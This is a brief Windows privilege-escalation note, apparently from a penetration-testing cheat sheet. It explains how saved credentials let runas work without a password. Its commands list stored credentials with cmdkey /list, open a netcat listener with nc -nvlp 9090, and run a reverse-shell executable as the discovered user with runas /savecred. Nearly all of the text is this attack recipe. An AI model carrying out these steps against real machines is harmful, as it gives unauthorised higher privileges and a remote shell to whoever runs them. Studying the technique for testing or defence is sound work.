- - -
Windows has a **Runas** command that allows users to run commands as other users just like **SUDO** in linux.
But this usually requires knowledge of the other user's password.

However, Windows also allows users to save their credentials on the system, and these saved credentials can be used to bypass.....

This requirement.
Find any stored credentials.

```cmd
cmdkey /list
```

```sh
nc -nvlp 9090
```

```cmd
runas /savecred /user:<user_you_found> C:\path\to\reverse.exe
```

- - -

